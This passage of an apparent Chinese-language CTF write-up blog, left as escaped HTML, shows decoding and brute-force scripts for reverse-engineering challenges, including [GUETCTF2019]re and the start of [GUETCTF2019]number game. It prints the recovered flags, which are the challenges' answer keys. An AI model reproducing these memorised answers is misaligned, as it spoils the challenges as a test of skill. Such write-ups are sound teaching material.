style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x85&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x92&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC9&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(res)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; xor2:
        res[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; j
    print(chr(res[i]), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print ()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到 flag: &lt;code&gt;1dc20f6e3d497d15cef47d9a66d6f1af&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;guetctf2019re&#34;&gt;[GUETCTF2019]re&lt;/h2&gt;
&lt;p&gt;先upx脱壳&lt;/p&gt;
&lt;p&gt;然后拖入ida&lt;/p&gt;
&lt;p&gt;找到关键字符串&lt;/p&gt;
&lt;p&gt;进入函数&lt;/p&gt;
&lt;p&gt;发现是对每一位进行乘法然后判断&lt;/p&gt;
&lt;p&gt;直接扔到python里算一下，发现 &lt;code&gt;a[6]&lt;/code&gt; 缺失，以及有一位算不出来，可能出现了溢出&lt;/p&gt;
&lt;p&gt;用c语言把这一位算出来，得到是 &lt;code&gt;a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对第7位进行暴力破解，发现1可以，得到flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;1629056&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;6771600&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;3682944&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10431000&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;3977328&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5138336&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7532250&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5551632&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;3409728&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13013670&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;6088797&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7884663&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;8944053&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5198490&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;4544518&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;10115280&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3645600&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;9667504&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5364450&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13464540&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5488432&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14479500&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;6451830&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;6252576&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7763364&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7327320&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;8741520&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;8871876&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;4086720&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;9374400&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5759124&lt;/span&gt; ]
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;166163712&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;731332800&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;357245568&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;1074393000&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;489211344&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;518971936&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;406741500&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;294236496&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;177305856&lt;/span&gt; ,  &lt;span style=&#34;color:#ae81ff&#34;&gt;650683500&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;298351053&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;386348487&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;438258597&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;249527520&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;445362764&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;981182160&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;174988800&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;493042704&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;257493600&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;767478780&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;312840624&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;140451150&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;316139670&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;619005024&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;372641472&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;373693320&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;498266640&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;452465676&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;208422720&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;515592000&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;719890500&lt;/span&gt; ]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(x)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (a[i] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; x[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;):
        print (chr(a[i] &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; x[i]), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, i)
print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;finish&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出为&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;flag{e65421110ba03099
 21
1c039337}
finish
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag: &lt;code&gt;flag{e165421110ba03099a1c039337}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;再写个c把这一位算一下（其实不如直接用c暴力破解了）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; x;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;; x&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;14479500&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1404511500&lt;/span&gt;){
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%c&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, x);
        }
    }
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;finish&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;guetctf2019number-game&#34;&gt;[GUETCTF2019]number game&lt;/h2&gt;
&lt;p&gt;先拖入ida进行静态分析，查看main函数核心代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v5, a3);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)check_input((&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v5) )&lt;span style=&#34;color:#75715e&#34;&gt;// 长度为10且只能是&amp;#34;01234&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  {
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_400758((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v5, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;);
    sub_400807((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v3, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v7);
    v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    sub_400881((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v7);                    &lt;span style=&#34;color:#75715e&#34;&gt;// v7 = &amp;#34;0421421430&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)sub_400917() )
    {
      puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TQL!&amp;#34;&lt;/span&gt;);
      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v7);
      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v5);
      puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    {
      puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;your are cxk!!&amp;#34;&lt;/span&gt;);
    }
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入的字符串需要通过两个if语句&lt;/p&gt;
&lt;p&gt;先看第一个if语句对应的函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( strlen(a1) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a1[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; a1[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; )
      {
        puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong!&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
      }
    }
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong!&amp;#34;&lt;/span&gt;);
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是对输入数据的简单要求，要求是10个0-4自成的字符串&lt;/p&gt;
&lt;p&gt;再查看第二个if中的函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;j )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;k )
      {
